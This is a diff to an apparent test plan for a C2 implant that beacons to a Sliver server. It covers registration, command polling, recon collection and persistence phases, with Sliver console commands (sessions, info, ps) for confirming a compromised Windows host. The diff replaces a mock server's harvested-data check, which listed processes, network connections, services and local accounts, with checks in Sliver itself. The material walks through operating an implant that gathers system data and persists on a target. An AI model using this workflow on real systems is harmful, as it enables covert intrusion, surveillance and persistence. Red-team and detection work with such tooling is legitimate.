@@ -109,19 +109,13 @@ Request 2: POST /register?host=DESKTOP-XXXXX
   Sample: {"key": "aB3xQ9zK...", "backoff": 5}
   
 **Phase 7: Data Collection (T+30s to T+60s)**
-Request 3: POST /command?host=DESKTOP-XXXXX
-  Decrypted payload should contain:
-  - Hostname
-  - Process list (>100 processes)
-  - Network connections (IPv4 addresses)
-  - Service list
-  - User accounts (local)
-  - System uptime
+Request 3: GET /command?host=DESKTOP-XXXXX
+  Sliver listener responds with encrypted command (or empty if no command queued)
   
-Verify on Sliver server:
+Verify in Sliver console:
   - New session appears: "sessions" command shows host
-  - Session metadata: hostname, OS, user context
-  - Incoming data: monitoring JSON files in /tmp/cc_server_data/ (if using Python mock)
+  - Session hostname, OS, user context visible
+  - "info" command shows full agent metadata
 
 **Phase 8: Persistence Installation (T+60s to T+120s)**
 Verify on target Windows:
@@ -212,25 +206,23 @@ sliver > sessions
 [DESKTOP-M919A7K] connected from 10.0.2.15
 ```
 
-4. **Data Verification (5 minutes)**
+4. **Agent Verification in Sliver (5 minutes)**
 ```bash
-# Check C2 server received data (if using Python mock)
-ls -lh /tmp/cc_server_data/
-cat /tmp/cc_server_data/monitoring_*.json | jq .
+# Connect to Sliver console
+sliver-client console
 
-# Expected JSON structure:
-{
-  "timestamp": "2026-10-15 20:45:00",
-  "hostname": "DESKTOP-M919A7K",
-  "processes_count": 180,
-  "network_count": 4,
-  "services_count": 262,
-  "users": ["Administrator", "Guest"],
-  "user_groups": ["Administrators", "Remote Desktop Users"],
-  "network_adapters": [...],
-  "running_services": [...],
-  "installed_software": [...]
-}
+# List all active sessions
+sliver > sessions
+# Output: [DESKTOP-M919A7K] connected from 10.0.2.15
+
+# Get agent metadata
+sliver > use DESKTOP-M919A7K
+[DESKTOP-M919A7K] > info
+# Shows: hostname, OS, processes, user, privileges
+
+# Verify recon data collected
+[DESKTOP-M919A7K] > ps
+# Process list available
 ```
 
 5. **Persistence Verification (5 minutes)**
